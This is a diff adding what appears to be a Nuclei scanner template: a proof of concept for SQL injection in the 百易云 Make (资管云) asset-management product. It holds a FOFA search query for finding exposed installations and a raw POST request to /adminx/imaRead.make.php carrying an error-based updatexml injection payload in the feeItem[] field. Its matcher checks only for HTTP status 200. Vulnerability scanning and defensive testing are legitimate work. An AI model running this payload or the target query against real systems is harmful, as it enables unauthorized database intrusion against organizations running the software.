@@ -1,0 +1,26 @@
+id: poc-fbdi1iuiyfqs0xgz
+info:
+  name: 百易云Make存在Sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fbdi1iuiyfqs0xgz'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fbdi1iuiyfqs0xgz
+    fofa: body="media/css/uniform.default.css" && body="资管云"||body="不要着急，点此"||title="资管云"
+http:
+- raw:
+  - 'POST /adminx/imaRead.make.php?act=remake HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(123)),1)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
